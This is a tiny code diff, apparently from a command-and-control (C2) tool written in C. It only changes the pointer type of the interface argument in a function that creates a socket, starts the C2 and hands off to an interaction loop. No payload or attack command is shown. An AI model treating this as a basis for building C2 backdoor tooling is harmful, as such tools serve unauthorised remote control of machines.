@@ -289,7 +289,7 @@ void interact(int sockfd) {
 }
 
 // initializes the options and starts the c2
-void c2_init_n_call(unsigned char *interface_to_bind) {
+void c2_init_n_call(char *interface_to_bind) {
     int sockfd = create_socket(interface_to_bind);
 
     interact(sockfd);
